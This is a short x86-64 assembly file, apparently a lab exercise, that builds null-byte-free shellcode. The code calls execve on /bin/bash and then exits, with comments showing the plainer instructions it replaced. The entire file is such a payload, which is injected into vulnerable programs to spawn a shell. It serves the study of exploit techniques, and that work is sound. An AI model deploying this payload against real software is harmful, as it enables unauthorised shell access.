# program just needs to call execve and exit!
        .global _start

        .text
_start:
	# syscall to execve
	addb $0x3b, %al
	#mov $59, %rax 			# calling execve
	lea 0x01111129(%rip), %rdi
	sub $0x111110e, %rdi
	#mov $path_to_bash, %rdi
	push %rdi			#push path into stack to be first val of argv
	push %r9			# push null ptr into stack to be second val of argv
	push %rsp
	pop %rsi
	#mov %rsp, %rsi			# push stack as argv[]
	xor %rdx, %rdx
	#mov $0, %rdx			# 0 read as null pointer, nothing passed
	syscall

	# above syscall works if rsi is $0, so can't really tell if argv[0] passsed correctly
	# doesn't matter anyway?

        # exit(0)
        xor %rax, %rax
        addb $60, %al                   # system call 60 is exit
        xor %rdi, %rdi                  # we want return code 0
        syscall                         # invoke operating system to exit

path_to_bash:
        .ascii  "/bin/bash"
